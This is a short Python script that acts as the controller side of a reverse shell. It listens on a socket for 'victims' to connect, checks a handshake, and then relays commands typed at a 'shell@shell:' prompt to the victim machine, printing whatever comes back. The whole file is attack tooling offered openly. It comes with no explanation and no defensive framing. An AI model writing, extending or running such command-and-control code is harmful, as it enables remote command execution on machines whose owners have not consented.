import socket

def main():
    server = socket.socket()
    server.bind(('localhost', 7777))
    server.listen(1)
    print("Waiting for victims to connect...")

    while True:
        victim, dir = server.accept()
        print(f'Connected from {dir}')

        handshake = victim.recv(1024)

        if handshake.decode('utf-8') == '1':
            while True:
                command = input("shell@shell: ")
                victim.send(command.encode('utf-8'))
                result = victim.recv(2048).decode('utf-8')
                print(result)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit()